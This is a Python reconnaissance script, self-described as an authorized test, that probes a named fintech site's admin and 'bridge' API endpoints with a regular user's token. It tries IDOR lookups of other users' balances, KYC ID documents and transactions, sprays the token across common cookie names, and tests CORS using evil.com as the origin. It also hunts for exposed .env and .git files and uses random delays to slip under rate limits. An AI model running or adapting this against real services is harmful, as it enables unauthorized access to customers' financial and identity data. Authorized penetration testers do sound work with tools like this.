#!/usr/bin/env python3
"""
Broken Access Control Test Script for Pouch.ph Admin/Bridge Endpoints

Authorized security research tool that tests whether admin-only API
endpoints are properly protected against access by regular user tokens.

Usage:
    python3 test_auth_bypass.py --token YOUR_TOKEN --username YOUR_USERNAME --mode recon
    python3 test_auth_bypass.py --token YOUR_TOKEN --username YOUR_USERNAME --mode recon --header-auth
    python3 test_auth_bypass.py --token YOUR_TOKEN --username YOUR_USERNAME --mode recon --cookie-name connect.sid
"""

import argparse
import json
import sys
import time
import random
import requests
from datetime import datetime
from urllib.parse import urljoin


# ---------------------------------------------------------------------------
# Color helpers for terminal output
# ---------------------------------------------------------------------------

class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def colored(text, color):
    return f"{color}{text}{Colors.RESET}"


# ---------------------------------------------------------------------------
# Endpoint definitions
# ---------------------------------------------------------------------------

def get_admin_get_endpoints(username, fake_user_id="000000000000000000000000"):
    """
    GET endpoints that should be restricted to admin/bridge users only.
    Each entry: (path, description, severity)
    severity: CRITICAL = admin-only, HIGH = sensitive data, MEDIUM = info leak
    """
    return [
        # Bridge user management (admin panel)
        ("/api/v3/bridge/users?limit=10", "Bridge: List all users", "CRITICAL"),
        ("/api/v3/bridge/users?limit=10&isVerified=true", "Bridge: List verified users", "CRITICAL"),
        ("/api/v3/bridge/users?limit=10&isBanned=true", "Bridge: List banned users", "CRITICAL"),
        ("/api/v3/bridge/users?limit=10&isBusiness=true", "Bridge: List business users", "CRITICAL"),
        ("/api/v3/bridge/users?limit=10&isIdUploaded=true&isVerified=false", "Bridge: List users pending review", "CRITICAL"),
        ("/api/v3/bridge/users?limit=10&upgradeStatus=pending", "Bridge: List users pending upgrade", "CRITICAL"),
        ("/api/v3/bridge/users?limit=10&upgradeStatus=completed&isVerified=true&isUpgraded=true", "Bridge: List upgraded users", "CRITICAL"),
        ("/api/v3/bridge/users?limit=10&upgradeStatus=failed&isVerified=false", "Bridge: List failed upgrade users", "CRITICAL"),
        ("/api/v3/bridge/users?limit=10&isForMigration=true", "Bridge: List migration users", "CRITICAL"),
        ("/api/v3/bridge/users?limit=10&isForMigrationAccepted=true", "Bridge: List accepted migration users", "CRITICAL"),
        ("/api/v3/bridge/users?limit=10&hasRetakeFields=true&isOld=true", "Bridge: List retake migration users", "CRITICAL"),

        # Bridge user balance lookups (IDOR test -- try another username)
        (f"/api/v3/bridge/users/balances?username={username}", "Bridge: Own balance lookup via bridge", "HIGH"),
        ("/api/v3/bridge/users/balances?username=admin", "Bridge: Balance lookup for 'admin'", "CRITICAL"),
        ("/api/v3/bridge/users/balances?username=test", "Bridge: Balance lookup for 'test'", "CRITICAL"),

        # Bridge user files (IDOR -- fake user ID)
        (f"/api/v3/bridge/users/{fake_user_id}/files?key=test", "Bridge: User files with fake ID", "CRITICAL"),

        # Bridge transactions
        ("/api/v3/bridge/transactions?limit=10", "Bridge: List all transactions", "CRITICAL"),
        (f"/api/v3/bridge/transactions?username={username}&limit=10", "Bridge: Own transactions via bridge", "HIGH"),
        ("/api/v3/bridge/transactions?username=admin&limit=10", "Bridge: Transactions for 'admin'", "CRITICAL"),

        # Bridge transaction list (v0)
        ("/api/v0/bridge/transaction/list?status=pending-review", "Bridge: Pending review transactions", "CRITICAL"),
        ("/api/v0/bridge/transaction/list?status=completed", "Bridge: Completed transactions", "CRITICAL"),

        # Bridge view user ID documents
        (f"/api/v0/bridge/user/view-id?username={username}", "Bridge: View own ID document", "HIGH"),
        ("/api/v0/bridge/user/view-id?username=admin", "Bridge: View other user ID document", "CRITICAL"),

        # Bridge business listing
        ("/api/v0/bridge/business/list", "Bridge: List all businesses", "CRITICAL"),

        # KYC dashboard audit trails
        ("/api/v3/bridge/kyc-dashboard/audit-trails?timeframe=ALL", "Bridge: KYC audit trails (all time)", "CRITICAL"),
        ("/api/v3/bridge/kyc-dashboard/audit-trails?timeframe=TODAY", "Bridge: KYC audit trails (today)", "CRITICAL"),

        # KYC document retrieval (v0)
        (f"/api/v0/kyc/user/PH?userId={fake_user_id}&documents=true", "KYC: Documents for fake user ID", "CRITICAL"),

        # Cashback transactions (bridge/admin)
        ("/api/v0/transaction/cashback/all?page=1&limit=10&search=", "Bridge: All cashback transactions", "CRITICAL"),

        # Netbank transaction lookup
        ("/api/v2/netbank/transactions/test123", "Netbank: Transaction lookup by ID", "HIGH"),

        # Intake form
        ("/api/v2/intake-form?referenceId=test123", "Intake form: Lookup by reference ID", "HIGH"),

        # Exchange rates (may be public, but worth checking)
        ("/api/v0/exchange-rates", "Exchange rates (possibly public)", "MEDIUM"),

        # User profile endpoint
        ("/api/v0/user", "Current user profile", "MEDIUM"),

        # Image URL resolution
        ("/api/v0/image/url/test-key", "Image URL resolution", "MEDIUM"),

        # Banks listing
        ("/api/v2/netbank/banks", "Netbank banks list (possibly public)", "MEDIUM"),

        # Profile picture
        (f"/api/v2/user/profile-picture?string={username}", "Profile picture for own user", "MEDIUM"),
        ("/api/v2/user/profile-picture?string=admin", "Profile picture for 'admin'", "MEDIUM"),

        # Files retrieval (generic)
        ("/api/v3/files?key=test-key", "Files: Retrieve by key", "HIGH"),

        # Custom biller transactions (admin/biller)
        ("/api/v3/custom/transactions", "Custom biller transactions CSV", "CRITICAL"),

        # Batch payment inquiry
        (f"/api/v0/transaction/batch-payment?sender={username}", "Batch payment: Own inquiry", "HIGH"),
        ("/api/v0/transaction/batch-payment?sender=admin", "Batch payment: Other user inquiry", "CRITICAL"),

        # Organization units
        ("/api/v3/organizations/coop", "Organization: Coop units listing", "HIGH"),

        # User sweep config endpoints (bridge variant -- IDOR)
        (f"/api/v3/bridge/users/{fake_user_id}/config/sweep", "Bridge: Sweep config for fake user (GET attempt)", "CRITICAL"),

        # Regular user transactions (IDOR)
        (f"/api/v0/transactions?activeProfileUsername={username}", "Transactions: Own (regular endpoint)", "MEDIUM"),
        ("/api/v0/transactions?activeProfileUsername=admin", "Transactions: Other user (IDOR)", "HIGH"),

        # Contacts (IDOR)
        ("/api/v0/contacts", "Contacts: Own contacts listing", "MEDIUM"),

        # Payment methods
        ("/api/v0/payment-method?method=all", "Payment methods listing", "MEDIUM"),
    ]


def get_source_map_paths():
    """Common source map and debug paths to check for information disclosure."""
    return [
        "/static/js/main.js.map",
        "/static/js/bundle.js.map",
        "/static/js/0.chunk.js.map",
        "/static/js/main.chunk.js.map",
        "/static/js/vendors~main.chunk.js.map",
        "/asset-manifest.json",
        "/manifest.json",
        "/.env",
        "/api/docs",
        "/api/swagger",
        "/api/v0/docs",
        "/api/v3/docs",
        "/graphql",
        "/api/graphql",
        "/.git/config",
        "/robots.txt",
        "/sitemap.xml",
        "/health",
        "/api/health",
        "/api/v0/health",
    ]


# ---------------------------------------------------------------------------
# Test runner
# ---------------------------------------------------------------------------

class AuthBypassTester:
    def __init__(self, base_url, token, username, mode, cookie_name, header_auth, verbose):
        self.base_url = base_url.rstrip("/")
        self.token = token
        self.username = username
        self.mode = mode
        self.cookie_name = cookie_name
        self.header_auth = header_auth
        self.verbose = verbose

        self.results = []
        self.critical_findings = []

        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": self.base_url + "/dashboard",
            "Origin": self.base_url,
        })

        # Set up auth -- either cookie-based or header-based
        if self.header_auth:
            self.session.headers["Authorization"] = f"Bearer {self.token}"
        else:
            # Try cookie-based auth
            if self.cookie_name:
                cookie_names = [self.cookie_name]
            else:
                # Try common cookie names
                cookie_names = ["token", "session", "connect.sid", "sid",
                                "auth", "jwt", "access_token", "pouch_session"]
            for name in cookie_names:
                self.session.cookies.set(name, self.token, domain=self._get_domain())

        # Verify SSL by default
        self.session.verify = True

    def _get_domain(self):
        """Extract domain from base URL for cookie setting."""
        from urllib.parse import urlparse
        parsed = urlparse(self.base_url)
        return parsed.hostname

    def _delay(self):
        """Random delay between requests to avoid rate limiting."""
        time.sleep(random.uniform(1.0, 2.0))

    def _make_request(self, method, path, **kwargs):
        """Make an HTTP request and return the response."""
        url = urljoin(self.base_url, path)
        try:
            resp = self.session.request(method, url, timeout=15, **kwargs)
            return resp
        except requests.exceptions.SSLError:
            # Retry without SSL verification as a fallback, but warn
            print(colored("  [!] SSL error, retrying without verification", Colors.YELLOW))
            try:
                resp = self.session.request(method, url, timeout=15, verify=False, **kwargs)
                return resp
            except Exception as e:
                print(colored(f"  [!] Request failed: {e}", Colors.RED))
                return None
        except requests.exceptions.ConnectionError as e:
            print(colored(f"  [!] Connection error: {e}", Colors.RED))
            return None
        except requests.exceptions.Timeout:
            print(colored("  [!] Request timed out", Colors.YELLOW))
            return None
        except Exception as e:
            print(colored(f"  [!] Unexpected error: {e}", Colors.RED))
            return None

    def _classify_response(self, resp, severity):
        """Classify a response as concerning or not."""
        if resp is None:
            return "ERROR"
        if resp.status_code in (200, 201):
            if severity == "CRITICAL":
                return "CRITICAL"
            elif severity == "HIGH":
                return "HIGH"
            else:
                return "OK"
        elif resp.status_code in (401, 403):
            return "PROTECTED"
        elif resp.status_code == 404:
            return "NOT_FOUND"
        elif resp.status_code == 429:
            return "RATE_LIMITED"
        elif resp.status_code >= 500:
            return "SERVER_ERROR"
        else:
            return "OTHER"

    def _print_result(self, path, description, resp, classification, severity):
        """Print the result of a single endpoint test."""
        if resp is None:
            status_str = "ERR"
            size_str = "0"
        else:
            status_str = str(resp.status_code)
            size_str = str(len(resp.content))

        # Color coding
        if classification == "CRITICAL":
            color = Colors.RED
            prefix = "[CRITICAL]"
        elif classification == "HIGH":
            color = Colors.YELLOW
            prefix = "[HIGH]    "
        elif classification == "PROTECTED":
            color = Colors.GREEN
            prefix = "[SAFE]    "
        elif classification == "NOT_FOUND":
            color = Colors.CYAN
            prefix = "[404]     "
        elif classification == "RATE_LIMITED":
            color = Colors.YELLOW
            prefix = "[RATELIM] "
        elif classification == "SERVER_ERROR":
            color = Colors.YELLOW
            prefix = "[5xx]     "
        elif classification == "ERROR":
            color = Colors.RED
            prefix = "[ERROR]   "
        else:
            color = Colors.RESET
            prefix = "[OK]      "

        print(colored(f"  {prefix} {status_str} | {size_str:>8}B | {description}", color))
        print(f"           {path}")

        # Show response preview on interesting results
        if resp is not None and classification in ("CRITICAL", "HIGH") and self.verbose:
            body = resp.text[:200]
            print(colored(f"           Response: {body}", Colors.YELLOW))
        elif resp is not None and classification in ("CRITICAL",):
            body = resp.text[:200]
            print(colored(f"           Response: {body}", Colors.RED))

        print()

    def test_endpoint(self, method, path, description, severity, **kwargs):
        """Test a single endpoint."""
        resp = self._make_request(method, path, **kwargs)
        classification = self._classify_response(resp, severity)

        result = {
            "path": path,
            "description": description,
            "method": method,
            "severity": severity,
            "status_code": resp.status_code if resp else None,
            "response_size": len(resp.content) if resp else 0,
            "classification": classification,
        }
        self.results.append(result)

        if classification == "CRITICAL":
            self.critical_findings.append(result)

        self._print_result(path, description, resp, classification, severity)
        self._delay()
        return result

    def test_cors(self):
        """Test CORS configuration."""
        print(colored("\n=== CORS Configuration Tests ===\n", Colors.BOLD))

        origins_to_test = [
            "https://evil.com",
            "https://attacker.pouch.ph",
            "null",
            self.base_url,
        ]

        for origin in origins_to_test:
            url = urljoin(self.base_url, "/api/v0/user")
            try:
                resp = self.session.options(url, headers={
                    "Origin": origin,
                    "Access-Control-Request-Method": "GET",
                    "Access-Control-Request-Headers": "Authorization, Content-Type",
                }, timeout=10)

                acao = resp.headers.get("Access-Control-Allow-Origin", "not set")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "not set")

                is_dangerous = (acao == "*" or acao == origin) and origin != self.base_url

                color = Colors.RED if is_dangerous else Colors.GREEN
                prefix = "[CRITICAL]" if is_dangerous else "[OK]      "

                print(colored(
                    f"  {prefix} Origin: {origin}\n"
                    f"           ACAO: {acao} | ACAC: {acac} | Status: {resp.status_code}",
                    color
                ))

                if is_dangerous:
                    self.critical_findings.append({
                        "path": "/api/v0/user (CORS)",
                        "description": f"CORS allows origin: {origin} with credentials: {acac}",
                        "method": "OPTIONS",
                        "severity": "CRITICAL",
                        "status_code": resp.status_code,
                        "response_size": 0,
                        "classification": "CRITICAL",
                    })

                print()
            except Exception as e:
                print(colored(f"  [ERROR]   Origin: {origin} -- {e}\n", Colors.RED))

            self._delay()

    def test_source_maps(self):
        """Test for accessible source maps and debug endpoints."""
        print(colored("\n=== Source Map / Information Disclosure Tests ===\n", Colors.BOLD))

        for path in get_source_map_paths():
            resp = self._make_request("GET", path)
            if resp is not None and resp.status_code == 200:
                size = len(resp.content)
                # Source maps are typically large
                is_sourcemap = path.endswith(".map") and size > 1000
                is_sensitive = path in ("/.env", "/.git/config") and size > 10
                is_api_doc = path in ("/api/docs", "/api/swagger", "/graphql", "/api/graphql") and size > 100

                if is_sourcemap or is_sensitive or is_api_doc:
                    classification = "CRITICAL" if is_sensitive else "HIGH"
                    color = Colors.RED if is_sensitive else Colors.YELLOW
                    prefix = "[CRITICAL]" if is_sensitive else "[HIGH]    "
                    print(colored(f"  {prefix} 200 | {size:>8}B | {path}", color))
                    if self.verbose:
                        print(colored(f"           Response: {resp.text[:200]}", Colors.YELLOW))
                    finding = {
                        "path": path,
                        "description": f"Accessible: {path}",
                        "method": "GET",
                        "severity": classification,
                        "status_code": 200,
                        "response_size": size,
                        "classification": classification,
                    }
                    self.results.append(finding)
                    if classification == "CRITICAL":
                        self.critical_findings.append(finding)
                else:
                    print(f"  [OK]      200 | {size:>8}B | {path}")
                    self.results.append({
                        "path": path,
                        "description": f"Accessible: {path}",
                        "method": "GET",
                        "severity": "MEDIUM",
                        "status_code": 200,
                        "response_size": size,
                        "classification": "OK",
                    })
            elif resp is not None:
                print(f"  [--]      {resp.status_code} | {len(resp.content):>8}B | {path}")
            else:
                print(f"  [ERROR]   --- |        0B | {path}")

            # Shorter delay for static files
            time.sleep(0.5)

        print()

    def run_recon(self):
        """Run all read-only reconnaissance tests."""
        print(colored("=" * 72, Colors.BOLD))
        print(colored(" Pouch.ph Broken Access Control Tester -- RECON MODE", Colors.BOLD))
        print(colored("=" * 72, Colors.BOLD))
        print(f"  Target:   {self.base_url}")
        print(f"  Username: {self.username}")
        print(f"  Auth:     {'Bearer header' if self.header_auth else 'Cookie-based'}")
        if not self.header_auth:
            names = self.cookie_name if self.cookie_name else "token, session, connect.sid, ..."
            print(f"  Cookies:  {names}")
        print(f"  Mode:     {self.mode}")
        print(f"  Time:     {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(colored("=" * 72, Colors.BOLD))

        # Phase 1: Validate auth token
        print(colored("\n=== Phase 1: Auth Token Validation ===\n", Colors.BOLD))
        resp = self._make_request("GET", "/api/v0/user")
        if resp is None:
            print(colored("  [!] Cannot connect to target. Aborting.", Colors.RED))
            return
        elif resp.status_code == 200:
            try:
                user_data = resp.json()
                user_obj = user_data.get("user", {})
                role = user_obj.get("role", "unknown")
                uname = user_obj.get("username", "unknown")
                print(colored(f"  [+] Token is valid. Logged in as: {uname} (role: {role})", Colors.GREEN))
                if role in ("admin", "bridge"):
                    print(colored(
                        f"  [!] WARNING: Token belongs to a privileged user (role={role}).\n"
                        f"      Results will not show access control issues -- use a regular user token.",
                        Colors.YELLOW
                    ))
            except (json.JSONDecodeError, KeyError):
                print(colored("  [+] Token returned 200 but response is not standard JSON.", Colors.YELLOW))
        elif resp.status_code in (401, 403):
            print(colored("  [-] Token appears invalid or expired (got 401/403).", Colors.RED))
            print(colored("      Tests will continue but may all return 401/403.\n", Colors.YELLOW))
        else:
            print(colored(f"  [?] Unexpected status {resp.status_code} from /api/v0/user", Colors.YELLOW))
        self._delay()

        # Phase 2: Admin/bridge GET endpoints
        print(colored("\n=== Phase 2: Admin/Bridge Endpoint Access Tests (GET) ===\n", Colors.BOLD))
        endpoints = get_admin_get_endpoints(self.username)
        for path, description, severity in endpoints:
            self.test_endpoint("GET", path, description, severity)

        # Phase 3: CORS
        self.test_cors()

        # Phase 4: Source maps
        self.test_source_maps()

        # Phase 5: Response header analysis
        print(colored("\n=== Phase 5: Security Header Analysis ===\n", Colors.BOLD))
        resp = self._make_request("GET", "/")
        if resp is not None:
            security_headers = {
                "X-Content-Type-Options": "nosniff",
                "X-Frame-Options": "DENY or SAMEORIGIN",
                "Strict-Transport-Security": "max-age=...",
                "Content-Security-Policy": "...",
                "X-XSS-Protection": "1; mode=block",
                "Referrer-Policy": "...",
                "Permissions-Policy": "...",
            }
            for header, expected in security_headers.items():
                value = resp.headers.get(header)
                if value:
                    print(colored(f"  [+] {header}: {value}", Colors.GREEN))
                else:
                    print(colored(f"  [-] {header}: MISSING (expected: {expected})", Colors.YELLOW))

            # Check for server info leaks
            server = resp.headers.get("Server")
            powered = resp.headers.get("X-Powered-By")
            if server:
                print(colored(f"\n  [!] Server header exposed: {server}", Colors.YELLOW))
            if powered:
                print(colored(f"  [!] X-Powered-By header exposed: {powered}", Colors.YELLOW))

        print()

        # Summary
        self._print_summary()

    def _print_summary(self):
        """Print the final summary."""
        print(colored("=" * 72, Colors.BOLD))
        print(colored(" SUMMARY", Colors.BOLD))
        print(colored("=" * 72, Colors.BOLD))

        total = len(self.results)
        got_200 = sum(1 for r in self.results if r.get("status_code") in (200, 201))
        got_401_403 = sum(1 for r in self.results if r.get("status_code") in (401, 403))
        got_404 = sum(1 for r in self.results if r.get("status_code") == 404)
        got_429 = sum(1 for r in self.results if r.get("status_code") == 429)
        got_5xx = sum(1 for r in self.results if r.get("status_code") and r["status_code"] >= 500)
        errors = sum(1 for r in self.results if r.get("status_code") is None)
        critical_count = len(self.critical_findings)

        print(f"\n  Total endpoints tested:    {total}")
        print(colored(f"  Returned 200/201:          {got_200}", Colors.RED if got_200 > 0 else Colors.GREEN))
        print(colored(f"  Returned 401/403:          {got_401_403}", Colors.GREEN))
        print(f"  Returned 404:              {got_404}")
        print(f"  Returned 429 (rate limit): {got_429}")
        print(f"  Returned 5xx:              {got_5xx}")
        print(f"  Connection errors:         {errors}")
        print()

        if critical_count > 0:
            print(colored(f"  CRITICAL FINDINGS: {critical_count}", Colors.RED + Colors.BOLD))
            print(colored("  " + "-" * 50, Colors.RED))
            for finding in self.critical_findings:
                print(colored(
                    f"    [{finding['method']}] {finding['path']}\n"
                    f"           {finding['description']}\n"
                    f"           Status: {finding['status_code']} | Size: {finding['response_size']}B",
                    Colors.RED
                ))
                print()
        else:
            print(colored("  No CRITICAL findings. Admin endpoints appear properly protected.", Colors.GREEN))

        print(colored("=" * 72, Colors.BOLD))
        print(f"  Scan completed at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(colored("=" * 72, Colors.BOLD))


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Broken Access Control tester for Pouch.ph admin/bridge endpoints",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Recon with cookie-based auth (tries common cookie names)
  python3 test_auth_bypass.py --token abc123 --username myuser --mode recon

  # Recon with specific cookie name
  python3 test_auth_bypass.py --token abc123 --username myuser --mode recon --cookie-name connect.sid

  # Recon with Bearer token header
  python3 test_auth_bypass.py --token abc123 --username myuser --mode recon --header-auth

  # Verbose output
  python3 test_auth_bypass.py --token abc123 --username myuser --mode recon --verbose
        """
    )
    parser.add_argument(
        "--token", required=True,
        help="Auth token or cookie value from a regular user session"
    )
    parser.add_argument(
        "--base-url", default="https://app.pouch.ph",
        help="Base URL of the target (default: https://app.pouch.ph)"
    )
    parser.add_argument(
        "--mode", choices=["recon", "probe"], default="recon",
        help="Test mode: 'recon' for read-only GET tests, 'probe' for light write tests (default: recon)"
    )
    parser.add_argument(
        "--username", required=True,
        help="The regular user's own username (for self-referencing tests)"
    )
    parser.add_argument(
        "--verbose", action="store_true",
        help="Show response body previews on interesting results"
    )
    parser.add_argument(
        "--cookie-name", default=None,
        help="Specific cookie name to use (default: try common names like token, session, connect.sid)"
    )
    parser.add_argument(
        "--header-auth", action="store_true",
        help="Send token as Authorization: Bearer header instead of cookie"
    )

    args = parser.parse_args()

    if args.mode == "probe":
        print(colored(
            "\n[!] Probe mode is not yet implemented. "
            "Only recon (read-only) mode is available.\n"
            "    Probe mode would test write endpoints (PUT/POST/PATCH/DELETE)\n"
            "    with safe payloads. Use --mode recon for now.\n",
            Colors.YELLOW
        ))
        sys.exit(1)

    tester = AuthBypassTester(
        base_url=args.base_url,
        token=args.token,
        username=args.username,
        mode=args.mode,
        cookie_name=args.cookie_name,
        header_auth=args.header_auth,
        verbose=args.verbose,
    )

    tester.run_recon()


if __name__ == "__main__":
    main()
